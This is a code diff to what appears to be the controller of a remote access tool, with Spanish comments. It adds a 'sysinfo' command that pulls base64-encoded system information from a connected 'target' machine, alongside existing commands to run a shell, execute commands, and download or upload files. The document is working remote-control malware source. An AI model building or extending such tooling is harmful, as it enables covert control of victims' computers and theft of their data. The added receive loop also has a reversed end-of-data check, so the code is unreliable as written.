@@ -30,6 +30,7 @@
 #define WHITE   FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE
 
 // Prototipo
+char* getSystemInformation(SOCKET targetConn, char *command);
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort);
 int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort);
 int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct);
@@ -263,6 +264,34 @@ int downloadFunc(char *command, SOCKET targetConn, char *ip) {
     return 0;
 }
 
+char* getSystemInformation(SOCKET targetConn, char *command){
+    send(targetConn, command, strlen(command), 0);
+    char* recvData = malloc(SOCKBUFFER);
+
+    while (true){
+        recv(targetConn, recvData, SOCKBUFFER, 0);
+        if (strstr(recvData, "end\0") == 0)
+            break;
+        else 
+            printf("%s", recvData);
+            continue;
+        
+    }
+
+    return recvData;
+    
+}
+
+char* decodeSystemInformation(char *codedSysInfo){
+    char* decodedSystemInfo = base64_decode(codedSysInfo);
+    return decodedSystemInfo;
+}
+
+void StartGetSysInfo(SOCKET targetConn, char *command){
+    char *codedSysInfo = getSystemInformation(targetConn, command);
+    printf("%s", decodeSystemInformation(codedSysInfo));
+
+}
 
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
     char command[SOCKBUFFER] = "";
@@ -292,22 +321,30 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
             break;
 
         } else { 
-            // Descargar Archivo
+            // Panel de ayuda
             if (strcmp(command, "help") == 0 || strcmp(command, "h") == 0){
                 helpPannel();              
 
+            // Descargar Archivo remoto
             } else if (strstr(command, "download") != NULL){
                 downloadFunc(command, targetConn, clientIP); 
             
+            // Entrar en modo shell
             } else if (strcmp(command, "shell") == 0){
                 shell(targetConn, clientIP, clientPort);
             
+            // Ejecutar comando 
             } else if (strstr(command, "exec") != NULL){
                 char resp[SOCKBUFFER];
                 sndAndExecCmd(targetConn, command, resp); 
             
+            // Subir Archivo local
             } else if(strstr(command, "upload") != NULL){
                 StartSending(targetConn, command);
+                
+            // Comando no reconocido
+            } else if (strcmp(command, "sysinfo") == 0){
+                StartGetSysInfo(targetConn, command);
                 
             } else {
                 printColor("\n\t[!>] ", RED); printColor("Instruct Not Known...\n", YELLOW);
